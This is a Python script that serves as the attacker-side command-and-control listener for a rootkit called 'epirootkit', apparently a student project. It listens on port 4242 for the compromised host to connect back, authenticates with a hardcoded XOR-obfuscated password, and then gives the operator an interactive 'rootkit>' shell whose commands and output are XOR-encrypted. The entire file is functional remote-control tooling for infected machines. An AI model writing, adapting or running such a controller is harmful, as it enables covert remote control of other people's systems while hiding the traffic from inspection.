import socket
import sys
import time

DEBUG = True
KEY = "epirootkit"
HOST = "0.0.0.0"
PORT = 4242

def xor(data: bytes) -> bytes:
    """
    Implements the same XOR logic as the rootkit:
    decrypted[i] = buffer[i] ^ config.xor_key[i % strlen(config.xor_key)]
    """
    result = bytearray()
    for i, b in enumerate(data):
        result.append(b ^ ord(KEY[i % len(KEY)]))
    return bytes(result)

def debug_print(msg: str, data: bytes = None):
    if DEBUG:
        print(f"[DEBUG] {msg}")
        if data:
            print(f"[DEBUG] Raw data: {data}")
            print(f"[DEBUG] Hex: {data.hex()}")

def receive_response(client):
    """Receive and accumulate response until --EOF-- marker"""
    response = bytearray()
    while True:
        chunk = client.recv(2048)
        if not chunk:
            break
        response.extend(chunk)
        decrypted = xor(response).decode('ascii', errors='ignore')
        if '--EOF--' in decrypted:
            break
        time.sleep(0.1)  # Small delay to prevent CPU spinning
    return bytes(response)

def handle_client(client):
    try:
        # Send encrypted password
        password = b"epirootkit\n"
        encrypted_pass = xor(password)
        debug_print("Sending encrypted password", encrypted_pass)
        client.sendall(encrypted_pass)

        # Receive and decrypt auth response
        auth_response_encrypted = receive_response(client)
        if not auth_response_encrypted:
            print("No response received")
            return

        auth_response = xor(auth_response_encrypted)
        debug_print("Received encrypted auth response", auth_response_encrypted)
        debug_print("Decrypted auth response", auth_response)

        try:
            auth_response = auth_response.decode('ascii', errors='ignore')
            print("--- AUTH ---")
            print(auth_response.strip())
            print("------------\n")
        except UnicodeDecodeError:
            print("Warning: Received corrupted auth response")
            return

        if "FAIL" in auth_response:
            print("Authentication failed. Exiting.")
            return

        # Interactive shell loop
        while True:
            try:
                cmd = input("rootkit> ").strip()
                if not cmd:
                    continue
                if cmd.lower() == "exit":
                    break

                # Send encrypted command
                cmd_bytes = (cmd + "\n").encode('ascii')
                encrypted_cmd = xor(cmd_bytes)
                debug_print(f"Sending encrypted command: {cmd}", encrypted_cmd)
                client.sendall(encrypted_cmd)

                # Receive and decrypt response
                response_encrypted = receive_response(client)
                if response_encrypted:
                    response = xor(response_encrypted)
                    debug_print("Received encrypted response", response_encrypted)
                    debug_print("Decrypted response", response)

                    try:
                        response = response.decode('ascii')
                        print(response.strip())
                    except UnicodeDecodeError:
                        print("Warning: Received corrupted response")
                        response = response.decode('ascii', errors='ignore')
                        print(response.strip())

            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Error during command execution: {e}")
                break

    except Exception as e:
        print(f"Error handling client: {e}")
        return

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, PORT))
        server.listen(1)
        print(f"[*] Waiting for connection on {HOST}:{PORT}...")

        client, addr = server.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")

        handle_client(client)

if __name__ == "__main__":
    main()